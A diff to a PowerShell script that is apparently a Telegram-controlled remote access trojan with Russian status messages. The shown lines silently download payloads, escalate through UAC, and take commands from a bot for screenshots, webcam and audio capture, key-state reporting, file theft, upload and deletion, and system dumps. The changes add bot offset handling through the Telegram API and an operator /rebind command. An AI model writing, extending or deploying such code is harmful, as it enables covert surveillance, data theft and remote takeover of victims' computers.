@@ -15,7 +15,13 @@ if(!(Test-Path $p)){ try{ (New-Object Net.WebClient).DownloadFile($src,$p) }catc
 if(!(Test-Path $k)){ try{ (New-Object Net.WebClient).DownloadFile($ksrc,$k) }catch{} }
 $first = -not (Test-Path "$dir\.i")
 $MAX=3500; $o=0
-if(Test-Path $of){$o=[int](Get-Content $of -Raw)}
+if(Test-Path $of){ $o=[int](Get-Content $of -Raw) }
+else {
+  try{
+    $r=@((Invoke-RestMethod "$b/getUpdates?offset=-1&timeout=0").result)
+    if($r.Count -gt 0){ $o=[int]$r[-1].update_id+1; "$o" | Set-Content $of }
+  }catch{}
+}
 
 function Chunk($s){
   $s="$s"
@@ -91,7 +97,7 @@ function RelaunchAdmin{
 }
 
 $HELP=@'
-/info /admin /su /ip /env /whoami /priv
+/info /admin /su /rebind /ip /env /whoami /priv
 /shot /shots N /cam /rec N /monoff /monon /bright N
 /ls /tree /cat /write /del /cp /mv /mkdir /rename /size /hidden /fileinfo /hash
 /search NAME|PATH /findtext TEXT|PATH /zip SRC|OUT /unzip /dl URL|PATH /dlurl URL|DIR /up PATH /updir PATH
@@ -128,6 +134,7 @@ while($true){
         '/start'{ Send $c "на связи: $env:COMPUTERNAME"; break }
         '/info'{ $ip=(ipconfig | Select-String 'IPv4'); Send $c "host: $env:COMPUTERNAME`nuser: $env:USERNAME\$env:USERDOMAIN`nadmin: $(IsAdmin)`nos: $([Environment]::OSVersion.VersionString)`nuptime: $((Get-Date)-(gcim Win32_OperatingSystem).LastBootUpTime)`n$ip`nkeys: $(KlState)"; break }
         '/admin'{ Send $c "admin: $(IsAdmin)"; break }
+        '/rebind'{ Remove-Item $idf -Force; Send $c 'привязка сброшена, напиши ещё раз'; break }
         '/su'{ Send $c 'запросил UAC'; RelaunchAdmin; break }
         '/ip'{ Send $c (ipconfig /all | Out-String); break }
         '/env'{ Send $c (Get-ChildItem env: | Format-Table Name,Value -Auto | Out-String); break }
